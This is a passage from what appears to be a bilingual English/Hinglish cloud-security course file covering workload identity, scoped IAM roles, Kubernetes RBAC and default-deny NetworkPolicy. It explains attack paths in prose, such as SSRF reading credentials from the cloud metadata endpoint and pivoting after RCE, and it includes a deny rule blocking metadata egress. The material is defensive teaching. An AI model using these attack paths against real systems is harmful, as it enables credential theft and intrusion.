dropped, read-only root filesystem, seccomp. And the database role, from Lesson 3, grants only the tables and operations in use. Done across all these layers, a compromise of one service reaches a handful of specific things rather than cascading across the whole estate.

## The test

Take the service in your system with the largest attack surface — the public API, the image processor, whatever receives untrusted input. Write down, concretely and exhaustively, everything a root shell inside it can currently reach: which secrets it can read, which cloud API calls its role permits, which other pods it can connect to, which database rows it can touch, whether it can talk to the Kubernetes API. If that list is long, you have privilege to remove, and the exercise has told you exactly where. Repeat it after every significant change, because privilege accumulates.`,

    contentHi: `## Aakhri long-lived credential

Har secret ko ek manager mein move karne ke baad bhi, ek credential rehता hai: wo cheez jо application use karती hai manager ko, aur cloud APIs ko, ye saabit karne ke liye ki ise act karne ki permission hai. Agar wo ek stored key hai — ek file mein ek AWS access key, ek environment variable mein ek Vault token — aapne long-lived credentials eliminate nahi kiye, aapne unhe concentrate kiya hai. Workload identity is aakhri ko remove karता hai application ke proof of identity ko ek short-lived token banaकर jо platform issue karता hai, jо cryptographically verifiable hai, aur jо sirf tab valid hai jab us specific workload se present kiya jaता hai jise ye issued tha.

## OIDC federation pattern

Mechanism implementations ke across same hai. Platform — ek Kubernetes cluster, ya ek cloud ki VM layer — har workload ko ek signed identity token issue karता hai, ek JWT, ek specific identity assert karता hua jaise "is cluster ke namespace \`prod\` ka ServiceAccount \`api\`". Token ki ek short TTL hai, ek specific audience se scoped hai, aur platform dwara automatically rotated hai. Workload is token ko ek target system ko present karता hai: AWS STS, Vault, ek Google API. Target token ke signature ko platform ke public OIDC signing keys ke against verify karता hai, aur issuer, audience, aur subject claims check karता hai. Agar wo ek configured trust relationship se match karते hain, target apni short-lived credential issue karता hai. Is chain mein kahीं koi static key nahi hai.

## Implementations

AWS par, IRSA aur iska successor EKS Pod Identity is tarah kaam karते hain: pod ki projected ServiceAccount token STS par \`AssumeRoleWithWebIdentity\` ke via temporary IAM credentials ke liye exchange hoती hai. GCP par, Workload Identity ek Kubernetes ServiceAccount ko ek Google service account se bind karता hai, to pod us identity ke roop mein Google APIs call karता hai koi key file present nahi. Azure par, Workload Identity ek Entra application ya managed identity par ek federated credential configure karता hai jо cluster ke OIDC issuer ko trust karता hai. Ek service mesh mein, SPIFFE aur SPIRE har workload ko ek SVID issue karते hain ek SPIFFE ID ke saath jaise \`spiffe://acme/ns/prod/sa/api\`. Ek plain VM par, cloud instance metadata service instance ke role credentials provide karता hai, aur IMDSv2 essential hai: ye ek session token require karता hai aur ek hop limit enforce karता hai, jо ek SSRF vulnerability ko instance credentials padhने ke liye use hone se prevent karते hain.

## Least privilege ek blast-radius exercise ke roop mein

Least privilege state karna aasan hai aur actually karna mushkil hai, aur ise approach karne ka productive tareeka har workload ke liye ek concrete sawaal poochना hai: agar ye workload fully compromised hai — ek attacker ke paas isme ek root shell hai — wo kya reach kar sakते hain? Phir us reach ke har dimension ko minimum tak cut karो. Cloud ya IAM role ko sirf specific API actions grant karने chahिए, koi wildcards nahi, kabhi \`iam:*\` nahi. Kubernetes RBAC ko workload ke apne ConfigMap aur Secret par \`get\` by name grant karना chahिए, koi \`list\` nahi. NetworkPolicy namespace mein ingress aur egress dono ke liye default-deny honi chahिए. Filesystem aur capability posture Module 18 Lesson 4 se apply hoती hai. Aur database role Lesson 3 se sirf wo tables aur operations grant karता hai jо use mein hain.

## The test

Apne system mein sabse bade attack surface wali service lो. Concretely aur exhaustively likhो, sab kुछ jо isme ek root shell currently reach kar sakта hai: kaun se secrets ye padh sakती hai, kaun se cloud API calls iska role permit karता hai, kaun se doosre pods se ye connect kar sakती hai. Agar wo list lambi hai, aapke paas remove karने ke liye privilege hai. Har significant change ke baad ise repeat karो, kyunki privilege accumulate hoती hai.`,

    examples: [
      {
        title: 'A blast-radius audit of one service, layer by layer, before and after cutting privilege',
        titleHi: 'Ek service ka ek blast-radius audit, layer by layer, privilege cut karne se pehle aur baad',
        code: `# (prose worked example - a concrete least-privilege pass on one workload)
# =============================================================================
# SERVICE: prod/image-resizer  (receives user uploads, shells out to a converter -
#          exactly the kind of thing that gets an RCE)
#
# ---- BLAST RADIUS **BEFORE** (what a root shell in the pod reaches today) ----
#  identity:   a static AWS access key in env (AWS_ACCESS_KEY_ID=...) for an IAM
#              user with policy  s3:*  on  *  , plus  sts:*  and  iam:ListRoles
#  k8s RBAC:   ServiceAccount bound to a Role with  get,list  on  secrets  (all)
#              + it can  create pods  (a leftover from a debugging experiment)
#  network:    no NetworkPolicy in the namespace -> can reach every pod + the
#              internet + the cloud metadata endpoint (169.254.169.254)
#  fs/caps:    runs as root, writable rootfs, default caps
#  data:       the DB creds it holds are the shared app-user (SELECT+INSERT+UPDATE
#              +DELETE on every table)
#  => an RCE here = read every secret in the namespace, s3:* on the whole account,
#     assume other roles, launch pods, pivot to any service, full DB write. total.
#
# ---- BLAST RADIUS **AFTER** (each dimension cut to what it actually uses) ----
#  identity:   IRSA. no static key. role trust policy:
#                Principal: <cluster OIDC provider>
#                Condition: oidc:sub = system:serviceaccount:prod:image-resizer
#              role policy:  s3:GetObject, s3:PutObject  on
#                arn:aws:s3:::acme-uploads-prod/incoming/*  and  /resized/*  ONLY
#              max session duration: 15m
#  k8s RBAC:   Role:  get  on  secrets  with  resourceNames: ["image-resizer-db"]
#              only. no list. no pods. no cluster roles.
#  network:    namespace default-deny ingress+egress. allow: from the ingress
#              controller on :8080; to the DB on :5432; to kube-dns :53. that's it.
#              (metadata endpoint is now unreachable AND blocked by IMDSv2 hop limit.)
#  fs/caps:    runAsNonRoot, runAsUser 10001, drop ALL caps, readOnlyRootFilesystem,
#              emptyDir at /tmp, seccomp RuntimeDefault (Module 18 L4)
#  data:       dynamic DB creds (Lesson 3), role  image-resizer-rw  =  SELECT,INSERT
#              on  images  and  image_variants  only, 1h lease
#  => an RCE here = read/write two S3 prefixes for 15 min, read ONE secret, touch
#     TWO tables for 1h, reach the DB + ingress + DNS. contained.
# =============================================================================
echo "before: ~7 broad capabilities (s3:* / all secrets / create pods / root / full DB / metadata / any pod)"
echo "after:  6 narrow capabilities, each scoped to exact resources + short TTLs"`,
        output: `before: ~7 broad capabilities (s3:* / all secrets / create pods / root / full DB / metadata / any pod)
after:  6 narrow capabilities, each scoped to exact resources + short TTLs`,
        explain: 'This is the blast-radius exercise applied to one realistically-risky service — an image resizer that runs a converter on user-supplied files, which is a classic remote-code-execution target. The "before" column is what a root shell in that pod can reach as commonly deployed: a static AWS key with \`s3:*\` on everything plus \`sts\` and \`iam\` read, a ServiceAccount that can list all Secrets and create pods, no NetworkPolicy so it can reach every pod and the cloud metadata endpoint, root with a writable filesystem, and a shared database user with full write on every table. An RCE in that configuration is a full environment compromise. The "after" column cuts each dimension independently to what the service actually uses: workload identity via IRSA with a role scoped to two S3 prefixes and a fifteen-minute session, RBAC limited to \`get\` on one named Secret, a default-deny NetworkPolicy allowing only the ingress path, the database, and DNS, the non-root read-only hardening from Module 18, and dynamic database credentials scoped to two tables with a one-hour lease. The same RCE now reaches two S3 prefixes for fifteen minutes, one secret, two tables for an hour, and three network destinations — a contained incident instead of a catastrophic one. Nothing here is exotic; it is the same controls from across this course applied deliberately to one workload.',
        explainHi: 'Ye blast-radius exercise ek realistically-risky service par apply kiya gaya — ek image resizer jо user-supplied files par ek converter chalाता hai, jо ek classic remote-code-execution target hai. "Before" column wo hai jо us pod mein ek root shell reach kar sakта hai jaise commonly deployed: har cheez par \`s3:*\` wali ek static AWS key, ek ServiceAccount jо saare Secrets list kar sakती hai aur pods create kar sakती hai, koi NetworkPolicy nahi, ek writable filesystem ke saath root, aur har table par full write wala ek shared database user. Us configuration mein ek RCE ek full environment compromise hai. "After" column har dimension ko independently cut karता hai jо service actually use karती hai: IRSA ke via workload identity ek role ke saath jо do S3 prefixes aur ek pandrah-minute session se scoped hai, ek named Secret par \`get\` tak limited RBAC, ek default-deny NetworkPolicy. Wahi RCE ab contained hai.',
      },
    ],

    mistakes: [
      {
        wrong: `# a static cloud key for the pod, in a Secret, with a broad policy
  # Secret 'aws-creds':  AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY
  # IAM user 'app-prod' policy:  { "Effect": "Allow", "Action": "*", "Resource": "*" }
  #   ("* is simplest, we'll tighten it later" - narrator: they did not)
  # the key is: in a k8s Secret (base64, in etcd, in git if committed), in the pod's
  # env (/proc, kubectl describe), never rotated, and grants FULL ACCOUNT ACCESS.
  # one leak - a logged env, an SSRF reading /proc, a stolen etcd backup - = the
  # entire AWS account, indefinitely.`,
        right: `# workload identity (IRSA): no key, scoped role, short session
  # 1. the EKS cluster has an OIDC provider registered in IAM.
  # 2. an IAM role with a trust policy federating that provider:
  #    "Condition": { "StringEquals": {
  #       "<oidc>:sub": "system:serviceaccount:prod:app",
  #       "<oidc>:aud": "sts.amazonaws.com" } }
  # 3. the role's PERMISSION policy: only what the app calls, e.g.
  #    s3:GetObject/PutObject on one bucket prefix; sqs:ReceiveMessage on one queue.
  #    MaxSessionDuration: 900  (15 min)
  # 4. annotate the ServiceAccount:
  #    eks.amazonaws.com/role-arn: arn:aws:iam::...:role/prod-app
  # the pod's SDK now calls AssumeRoleWithWebIdentity with its projected SA token
  # and gets 15-min credentials for that scoped role. NO stored key. an SSRF or a
  # leaked env yields creds that expire in minutes and only touch one bucket + one queue.`,
        why: 'A static cloud access key held by a workload is a long-lived credential in the worst location, and pairing it with a wildcard policy makes any exposure a total account compromise. The key sits in a Kubernetes Secret — base64-encoded in etcd, in git if the manifest was committed — and in the pod\'s environment, where \`/proc\`, \`kubectl describe\`, a logged environment, or a server-side request forgery reading the metadata or process table all expose it. It is almost never rotated because rotation requires coordinating the change everywhere it is used. And with \`Action: *\` on \`Resource: *\` it grants everything, so a single leak is the entire account with no time limit. Workload identity eliminates the key. With IRSA, the cluster has an OIDC provider registered in IAM, and an IAM role has a trust policy that federates that provider and restricts the trust to a specific ServiceAccount subject and the STS audience. The role\'s permission policy grants only the specific actions on the specific resources the application uses, and the maximum session duration is set to fifteen minutes. The pod\'s SDK exchanges its projected ServiceAccount token for temporary credentials scoped to that role. There is no stored key to leak, an exposed credential expires in minutes, and even within that window it can only touch the handful of resources the role names.',
        whyHi: 'Ek workload dwara held ek static cloud access key sabse bure location mein ek long-lived credential hai, aur ise ek wildcard policy ke saath pair karna kisi bhi exposure ko ek total account compromise banaता hai. Key ek Kubernetes Secret mein baithती hai — etcd mein base64-encoded, git mein agar manifest committed tha — aur pod ke environment mein. Ye लगभग kabhi rotate nahi hoती. Aur \`Action: *\` ke saath \`Resource: *\` par ye sab kुछ grant karती hai. Workload identity key ko eliminate karता hai. IRSA ke saath, cluster ke paas IAM mein ek registered OIDC provider hai, aur ek IAM role ki ek trust policy hai jо us provider ko federate karती hai aur trust ko ek specific ServiceAccount subject tak restrict karती hai. Role ki permission policy sirf specific actions grant karती hai, aur maximum session duration pandrah minute par set hai. Koi stored key nahi hai.',
      },
      {
        wrong: `# workload identity adopted, but the role is still 'AdministratorAccess'
  # good: IRSA is set up, no static key, the trust policy correctly names the SA.
  # bad:  the role attached is the AWS-managed 'AdministratorAccess' policy,
  #       "so we don't get blocked during the migration".
  # -> the pod now assumes admin via a clean OIDC flow. the credential is
  #    short-lived (15 min) but it is ADMIN for those 15 minutes, auto-renewed
  #    forever. an RCE gets a rolling 15-min admin credential = effectively
  #    permanent admin. workload identity fixed the KEY problem, not the
  #    PRIVILEGE problem.`,
        right: `# workload identity is the delivery; least privilege is still a separate job
  # after IRSA is working, do the actual scoping:
  #  1. run the workload with CloudTrail on; collect every API call it makes over
  #     a representative week (or use IAM Access Analyzer / 'aws iam
  #     generate-service-last-accessed-details').
  #  2. write a policy that allows EXACTLY those actions on EXACTLY those resource
  #     ARNs. deny by default (that's automatic - only grant).
  #  3. add condition keys: aws:SourceVpc, aws:PrincipalTag, s3 prefix conditions.
  #  4. keep MaxSessionDuration low (15-60 min).
  #  5. re-review whenever the workload's behaviour changes; alert on 'AccessDenied'
  #     in CloudTrail for this role (tells you the policy is too tight OR someone's
  #     probing).
  # short-lived + scoped. not short-lived + admin.`,
        why: 'Workload identity and least privilege solve two different problems, and adopting the first does not address the second. Workload identity removes the stored long-lived key and replaces it with a short-lived, verifiable token — that is the delivery mechanism for the credential. Least privilege is about what the credential, however delivered, is allowed to do. Attaching \`AdministratorAccess\` to a role that is assumed through a clean IRSA flow gives you a credential that is short-lived in the sense that each issued token expires in fifteen minutes, but is automatically renewed indefinitely and grants full administrative access the entire time. An attacker with a root shell in the pod gets a rolling fifteen-minute admin credential, which is effectively permanent admin. The key problem is solved; the privilege problem is untouched. The actual scoping work has to be done separately: observe the workload\'s real API usage through CloudTrail or IAM Access Analyzer over a representative period, write a policy that allows exactly those actions on exactly those resource ARNs, add condition keys to constrain the source and the resources further, keep the session duration short, and alert on \`AccessDenied\` for the role so you learn when the policy is wrong or when something is probing.',
        whyHi: 'Workload identity aur least privilege do alag problems solve karते hain, aur pehle ko adopt karna doosre ko address nahi karता. Workload identity stored long-lived key ko remove karता hai aur ise ek short-lived, verifiable token se replace karता hai — wo credential ke liye delivery mechanism hai. Least privilege iske baare mein hai ki credential, chahे kaise bhi delivered, kya karने ki permission hai. Ek role ko \`AdministratorAccess\` attach karna jо ek clean IRSA flow ke through assumed hai aapko ek credential deता hai jо is sense mein short-lived hai ki har issued token pandrah minute mein expire hoता hai, par automatically indefinitely renewed hai aur poore samay full administrative access grant karता hai. Key problem solved hai; privilege problem untouched hai. Actual scoping work alag se karना hai: CloudTrail ke through workload ki real API usage observe karो, ek policy likhो jо exactly wo actions allow karती hai.',
      },
      {
        wrong: `# no NetworkPolicy: every pod can reach every pod, the internet, and metadata
  # the cluster has 40 services in one namespace. no NetworkPolicy objects exist.
  # -> the (default) behaviour is allow-all: the public-facing 'web' pod can open
  #    a connection to the 'billing-db', the 'internal-admin' service, the k8s API,
  #    the cloud metadata endpoint, and any host on the internet.
  # an RCE in 'web' can now port-scan the namespace, hit internal admin endpoints
  # with no auth (they assumed the network was the boundary), exfiltrate to the
  # internet, and try to read cloud creds from 169.254.169.254.`,
        right: `# default-deny per namespace, then allow only real dependencies
  # 1. a default-deny for the namespace (both directions):
  kind: NetworkPolicy
  spec:
    podSelector: {}                 # all pods
    policyTypes: [Ingress, Egress]  # deny both unless another policy allows
  # 2. per workload, allow exactly its edges:
  #    web:   ingress from ingress-nginx :8080 ; egress to api-svc :8443, kube-dns :53
  #    api:   ingress from web :8443 ; egress to postgres :5432, kube-dns :53, Vault :8200
  #    (nothing can reach billing-db except billing-svc; nothing egresses to the
  #     internet except the one service that needs a third-party API, via an
  #     egress gateway with an allowlist)
  # 3. block the metadata endpoint cluster-wide (a policy denying egress to
  #    169.254.169.254/32) AND rely on IMDSv2's hop limit as defence in depth.
  # now an RCE in 'web' can reach: api:8443 and DNS. that's the whole blast radius.`,
        why: 'Kubernetes networking is allow-all by default: with no NetworkPolicy objects, every pod can open a connection to every other pod, to the Kubernetes API, to the cloud metadata endpoint, and to any host on the internet. Teams frequently rely on the network being a boundary — internal admin services with weak or no authentication because "they\'re not exposed" — which is only true until one pod in the namespace is compromised. An RCE in a public-facing service in a flat namespace can then scan for other services, call internal endpoints that assumed network isolation, exfiltrate data to an arbitrary internet host, and attempt to read cloud credentials from the metadata endpoint. The fix is a default-deny NetworkPolicy per namespace covering both ingress and egress, followed by per-workload policies that allow only the specific connections each workload actually makes — its ingress from the ingress controller or its callers, its egress to the databases, caches, DNS, and secrets manager it uses. Services that never need internet egress get none; the one service that calls a third-party API goes through an egress gateway with an allowlist. Egress to the metadata endpoint is blocked cluster-wide as well, with IMDSv2\'s hop limit as a second layer. The result is that a compromise of any one pod can reach only that pod\'s real dependencies.',
        whyHi: 'Kubernetes networking by default allow-all hai: koi NetworkPolicy objects ke bina, har pod har doosre pod se, Kubernetes API se, cloud metadata endpoint se, aur internet par kisi bhi host se ek connection open kar sakта hai. Teams aksar network ke ek boundary hone par rely karती hain — weak ya koi authentication ke saath internal admin services kyunki "wo exposed nahi hain" — jо sirf tab tak true hai jab tak namespace mein ek pod compromised nahi hota. Ek flat namespace mein ek public-facing service mein ek RCE phir doosre services ke liye scan kar sakता hai, internal endpoints call kar sakता hai jinhone network isolation assume kiya. Fix per namespace ek default-deny NetworkPolicy hai jо ingress aur egress dono cover karती hai, jiske baad per-workload policies jо sirf specific connections allow karती hain. Metadata endpoint ke liye egress cluster-wide block hai. Result ye hai ki kisi bhi ek pod ka compromise sirf us pod ki real dependencies reach kar sakता hai.',
      },
    ],

    realWorld: [
      {
        en: '**The Capital One breach (2019)** — an SSRF vulnerability in a WAF let an attacker read IAM role credentials from the EC2 instance metadata endpoint (IMDSv1), then use that role\'s over-broad S3 permissions to exfiltrate ~100M records. Both fixes are in this lesson: IMDSv2 (blocks SSRF-to-metadata) and a least-privilege role (the WAF role should never have had bucket-wide list+get).',
        hi: '**Capital One breach (2019)** — ek WAF mein ek SSRF vulnerability ne ek attacker ko EC2 instance metadata endpoint (IMDSv1) se IAM role credentials padhने diya, phir us role ki over-broad S3 permissions use karके ~100M records exfiltrate kiye. Dono fixes is lesson mein hain: IMDSv2 aur ek least-privilege role.',
      },
      {
        en: '**IRSA / Workload Identity as the EKS/GKE default** — both AWS and Google now steer every guide toward workload identity over static keys, and the newer EKS Pod Identity simplifies the trust setup further. "no static cloud keys in a pod" is table stakes for a modern cluster.',
        hi: '**IRSA / Workload Identity EKS/GKE default ke roop mein** — AWS aur Google dono ab har guide ko static keys ke bजाy workload identity ki taraf steer karते hain, aur newer EKS Pod Identity trust setup ko aur simplify karता hai.',
      },
      {
        en: '**SPIFFE/SPIRE in zero-trust meshes** — large platforms (including at some banks and the original at a hyperscaler) issue every workload a SPIFFE SVID as its sole identity, used for mTLS between all services and for authenticating to internal APIs and secret stores — no service ever holds a shared credential, and identity is uniform across VMs, containers, and functions.',
        hi: '**Zero-trust meshes mein SPIFFE/SPIRE** — bade platforms har workload ko ek SPIFFE SVID iski sole identity ke roop mein issue karте hain, saare services ke beech mTLS ke liye aur internal APIs aur secret stores ko authenticate karने ke liye use kiya jaता hai — koi service kabhi ek shared credential nahi rakhती.',
      },
    ],

    interviewQA: [
      {
        q: 'What is workload identity, what problem does it solve that a secrets manager alone does not, and how does the OIDC federation flow work?',
        qHi: 'Workload identity kya hai, ye konsa problem solve karता hai jо ek secrets manager akele nahi karता, aur OIDC federation flow kaise kaam karता hai?',
        a: 'A secrets manager centralises your secrets, but the application still needs one credential to prove to the manager and to cloud APIs that it is allowed to act. If that is a stored long-lived key, you have not removed long-lived credentials, you have concentrated them into the one that unlocks everything. Workload identity solves this by making the application\'s proof of identity a short-lived token that the platform issues and that is only valid when presented from the specific workload it was issued to. The flow is OIDC federation. The platform — a Kubernetes cluster or a cloud VM layer — issues each workload a signed JWT asserting a specific identity, such as ServiceAccount \`api\` in namespace \`prod\`, with a short TTL, an audience restriction, and automatic rotation; it is not a secret an operator manages. The workload presents this token to a target: AWS STS, Vault, a Google API. The target verifies the JWT signature against the platform\'s public OIDC keys, published at a well-known URL, and checks the issuer, audience, and subject. If those match a configured trust relationship, the target issues its own short-lived credential — temporary STS credentials, a scoped Vault token — bound to a role mapped to that subject. There is no static key anywhere; the trust chain is target to platform OIDC issuer to this specific workload. AWS calls this IRSA or EKS Pod Identity, GCP calls it Workload Identity, Azure calls it Workload Identity with federated credentials, and SPIFFE/SPIRE provides a mesh-wide version with X.509 or JWT SVIDs.',
        aHi: 'Ek secrets manager aapke secrets centralise karता hai, par application ko abhi bhi ek credential chahिए manager ko aur cloud APIs ko ye saabit karने ke liye ki ise act karने ki permission hai. Agar wo ek stored long-lived key hai, aapne long-lived credentials remove nahi kiye. Workload identity ise solve karता hai application ke proof of identity ko ek short-lived token banaकर jо platform issue karता hai. Flow OIDC federation hai. Platform har workload ko ek signed JWT issue karता hai jо ek specific identity assert karता hai, ek short TTL, ek audience restriction, aur automatic rotation ke saath. Workload is token ko ek target ko present karता hai. Target JWT signature ko platform ke public OIDC keys ke against verify karता hai. Agar wo match karते hain, target apni short-lived credential issue karता hai. Kahीं koi static key nahi hai.',
      },
      {
        q: 'A team has adopted IRSA so there are no static keys, but the role is `AdministratorAccess`. Why is this still a serious problem?',
        qHi: 'Ek team ne IRSA adopt kiya to koi static keys nahi hain, par role `AdministratorAccess` hai. Ye abhi bhi ek serious problem kyun hai?',
        a: 'Because workload identity and least privilege solve two independent problems, and doing the first does not touch the second. Workload identity is about how the credential is delivered — it replaces a stored long-lived key with a short-lived, cryptographically verifiable token, which removes the "a leaked key file is valid forever" risk. Least privilege is about what the credential is permitted to do once obtained. A role with \`AdministratorAccess\` assumed through a clean IRSA flow produces a credential that is short-lived only in the narrow sense that each issued token expires in fifteen minutes — but it is renewed automatically and indefinitely, and for every one of those fifteen-minute windows it grants full control of the account. An attacker with a root shell in the pod simply calls the credential provider on a loop and holds a rolling admin credential, which is functionally permanent admin. The blast radius of an RCE in that pod is the entire AWS account. Fixing it is separate work: observe the workload\'s actual API calls over a representative period using CloudTrail or IAM Access Analyzer, write a policy granting exactly those actions on exactly those resource ARNs, add condition keys to constrain source network and resource tags, keep the session duration at fifteen to sixty minutes, and alert on \`AccessDenied\` for the role so you find out when the policy is too tight or when something is probing. Short-lived and scoped is the goal; short-lived and admin is not much better than a static admin key.',
        aHi: 'Kyunki workload identity aur least privilege do independent problems solve karते hain, aur pehla karna doosre ko touch nahi karता. Workload identity iske baare mein hai ki credential kaise delivered hai — ye ek stored long-lived key ko ek short-lived token se replace karता hai. Least privilege iske baare mein hai ki credential ko kya karने ki permission hai. Ek role \`AdministratorAccess\` ke saath jо ek clean IRSA flow ke through assumed hai ek credential produce karता hai jо sirf is narrow sense mein short-lived hai ki har issued token pandrah minute mein expire hoता hai — par ye automatically aur indefinitely renewed hai. Ek attacker ek loop par credential provider ko call karता hai aur ek rolling admin credential rakhता hai. Ise fix karना alag work hai: CloudTrail ke through workload ke actual API calls observe karो, ek policy likhो jо exactly wo actions grant karती hai.',
      },
      {
        q: 'Explain the "blast radius" approach to least privilege and how it applies across IAM, Kubernetes RBAC, and NetworkPolicy.',
        qHi: '"Blast radius" approach least privilege ke liye samjhाओ aur ye IAM, Kubernetes RBAC, aur NetworkPolicy ke across kaise apply hoता hai.',
        a: 'The blast-radius approach makes least privilege concrete by asking, for each workload, a single question: if this workload is fully compromised and an attacker has a root shell in it, what can they reach? You enumerate that reach exhaustively — which secrets, which cloud API actions, which other pods, which database rows, whether the Kubernetes API is reachable — and then cut every dimension to the minimum the workload actually uses. Across the layers: the IAM or cloud role grants only the specific API actions on the specific resource ARNs the workload calls, with no wildcards, never \`iam:*\`, a session duration of minutes, and condition keys restricting the source network and resource tags. Kubernetes RBAC grants \`get\` on the workload\'s own ConfigMap and Secret by name via \`resourceNames\`, with no \`list\` because \`list\` bypasses the name restriction, no cluster-scoped roles, no create or delete on workloads, and nothing outside its namespace. NetworkPolicy is default-deny for both ingress and egress in the namespace, then per-workload policies allow only the specific pods and ports the workload communicates with, plus DNS and the API server if needed, and egress to the cloud metadata endpoint is blocked. The filesystem and capability hardening from Module 18 and the dynamic least-privilege database role from Lesson 3 complete it. Done across all layers, an RCE in one service reaches a handful of specific, time-limited things instead of cascading through the estate. The test is to take your most exposed service and write the "before" list; if it is long, you know exactly what to cut.',
        aHi: 'Blast-radius approach least privilege ko concrete banaता hai har workload ke liye ek single sawaal poochकर: agar ye workload fully compromised hai aur ek attacker ke paas isme ek root shell hai, wo kya reach kar sakते hain? Aap us reach ko exhaustively enumerate karте ho — kaun se secrets, kaun se cloud API actions, kaun se doosre pods, kaun se database rows — aur phir har dimension ko minimum tak cut karте ho. Layers ke across: IAM role sirf specific API actions grant karता hai, koi wildcards nahi, kabhi \`iam:*\` nahi, minutes ki session duration. Kubernetes RBAC \`resourceNames\` ke via workload ke apne ConfigMap aur Secret par \`get\` grant karता hai, koi \`list\` nahi. NetworkPolicy ingress aur egress dono ke liye default-deny hai. Module 18 se filesystem hardening aur Lesson 3 se dynamic database role ise complete karते hain.',
      },
    ],

    exercises: [
      {
        task: 'In a comment, explain workload identity and the OIDC federation flow step by step, then name the implementation on AWS, GCP, Azure, a service mesh, and a plain VM (with why IMDSv2 matters).',
        taskHi: 'Ek comment mein, workload identity aur OIDC federation flow samjhाओ, phir har platform par implementation name karो.',
        hint: 'THE PROBLEM: even with a secrets manager, the app needs ONE credential to prove to the manager + cloud APIs that it may act. If that\'s a STORED long-lived key (an AWS key in a file, a Vault token in env), you didn\'t ELIMINATE long-lived credentials — you CONCENTRATED them into the one that unlocks everything. WORKLOAD IDENTITY makes that proof a SHORT-LIVED, PLATFORM-ISSUED, CRYPTOGRAPHICALLY-VERIFIABLE token that is ONLY valid FROM that specific workload — not a stored key. THE OIDC FEDERATION FLOW, STEP BY STEP: (1) the PLATFORM (a k8s cluster / a cloud VM layer) issues the workload a SIGNED identity token (a JWT) asserting a specific identity, e.g. `sub = system:serviceaccount:prod:api` — SHORT TTL, AUDIENCE-scoped, AUTO-ROTATED; NOT a secret an operator creates/stores. (2) the workload PRESENTS that token to a TARGET (AWS STS / Vault / a Google API / another internal service). (3) the target VERIFIES the JWT SIGNATURE against the platform\'s PUBLIC OIDC signing keys (published at a `.well-known/openid-configuration` + JWKS URL) and checks ISSUER + AUDIENCE + SUBJECT claims. (4) if they match a CONFIGURED TRUST RELATIONSHIP, the target issues its OWN short-lived credential (temp STS creds / a scoped Vault token) bound to a ROLE mapped to that subject. NO static key anywhere; trust chain = target -> platform OIDC issuer -> this specific workload. IMPLEMENTATIONS: AWS — IRSA (IAM Roles for Service Accounts) / EKS Pod Identity: the pod\'s PROJECTED SA token -> `sts:AssumeRoleWithWebIdentity` -> temp IAM creds; the role\'s TRUST policy names the cluster OIDC provider + `Condition: oidc:sub = system:serviceaccount:prod:api` + `oidc:aud = sts.amazonaws.com`; annotate the SA with `eks.amazonaws.com/role-arn`. GCP — Workload Identity: bind a k8s SA to a Google SA (or direct WIF); the pod calls Google APIs as that identity, NO key file. AZURE — Workload Identity: a FEDERATED CREDENTIAL on an Entra app / managed identity trusts the cluster\'s OIDC issuer + the SA subject -> AAD tokens, NO client secret. SERVICE MESH — SPIFFE / SPIRE: every workload gets an SVID (an X.509 cert OR a JWT) carrying a SPIFFE ID like `spiffe://acme/ns/prod/sa/api` — used for mTLS between services AND as a portable universal identity. PLAIN VM — cloud instance metadata: the instance\'s role creds via a local endpoint (`169.254.169.254`). IMDSv2 MATTERS: it requires a SESSION TOKEN obtained by a PUT request (a plain GET is refused) AND enforces a HOP LIMIT of 1 — together these stop an SSRF vulnerability in the app from being tricked into reading the instance credentials (this is exactly the Capital One 2019 breach: SSRF -> IMDSv1 -> IAM creds -> ~100M records).',
        hintHi: 'PROBLEM: ek secrets manager ke saath bhi, app ko EK credential chahिए manager + cloud APIs ko saabit karने ke liye. Agar wo ek STORED long-lived key hai, aapne long-lived credentials ELIMINATE nahi kiye — CONCENTRATE kiye. WORKLOAD IDENTITY us proof ko ek SHORT-LIVED, PLATFORM-ISSUED, VERIFIABLE token banaता hai jо SIRF us workload SE valid hai. OIDC FLOW: (1) PLATFORM workload ko ek SIGNED JWT issue karता hai (`sub = system:serviceaccount:prod:api`) — SHORT TTL, AUDIENCE-scoped, AUTO-ROTATED. (2) workload token ko TARGET ko PRESENT karता hai. (3) target JWT SIGNATURE ko platform ke PUBLIC OIDC keys ke against VERIFY karता hai + ISSUER + AUDIENCE + SUBJECT check karता hai. (4) match -> target apni short-lived credential issue karता hai. NO static key. IMPLEMENTATIONS: AWS — IRSA / EKS Pod Identity (`sts:AssumeRoleWithWebIdentity`, trust policy `oidc:sub` name karती hai); GCP — Workload Identity (k8s SA -> Google SA, NO key file); AZURE — Workload Identity (federated credential, NO client secret); MESH — SPIFFE/SPIRE (SVID, `spiffe://...`, mTLS); VM — instance metadata, IMDSv2 (session token PUT + hop limit 1 -> SSRF-to-metadata block; Capital One 2019).',
      },
      {
        task: 'In a comment, explain why workload identity and least privilege are separate problems (the "IRSA + AdministratorAccess" trap), and describe how to actually scope a cloud role.',
        taskHi: 'Ek comment mein, samjhाओ workload identity aur least privilege alag problems kyun hain, aur ek cloud role ko actually kaise scope karें.',
        hint: 'WORKLOAD IDENTITY and LEAST PRIVILEGE solve TWO INDEPENDENT problems; doing the first does NOT touch the second. WORKLOAD IDENTITY = how the credential is DELIVERED — replaces a stored long-lived key with a short-lived, cryptographically-verifiable token -> removes "a leaked key file is valid forever". LEAST PRIVILEGE = what the credential, HOWEVER delivered, is PERMITTED to do. THE "IRSA + AdministratorAccess" TRAP: IRSA is set up correctly (no static key, trust policy names the SA), but the role attached is the AWS-managed `AdministratorAccess` ("so we don\'t get blocked during the migration"). Now the pod assumes ADMIN via a clean OIDC flow. The credential is "short-lived" ONLY in the narrow sense that each issued token expires in 15 min — but it is AUTO-RENEWED indefinitely, and for every one of those windows it is ADMIN. An attacker with a root shell calls the credential provider on a loop -> a ROLLING 15-min admin credential = FUNCTIONALLY PERMANENT ADMIN. The blast radius of an RCE = the ENTIRE account. The key problem is solved; the privilege problem is UNTOUCHED. HOW TO ACTUALLY SCOPE A CLOUD ROLE: (1) run the workload with CloudTrail ON; collect EVERY API call it makes over a REPRESENTATIVE period (a week, including any batch/monthly jobs) — or use IAM Access Analyzer / `aws iam generate-service-last-accessed-details` to see what it has actually used. (2) write a policy allowing EXACTLY those actions on EXACTLY those resource ARNs (not `s3:*` on `*` — `s3:GetObject`/`s3:PutObject` on `arn:aws:s3:::acme-uploads-prod/incoming/*`). Deny is automatic (you only ever GRANT). (3) add CONDITION KEYS: `aws:SourceVpc`, `aws:PrincipalTag`, `aws:SourceIp`, s3 prefix conditions, `aws:RequestedRegion`. (4) keep 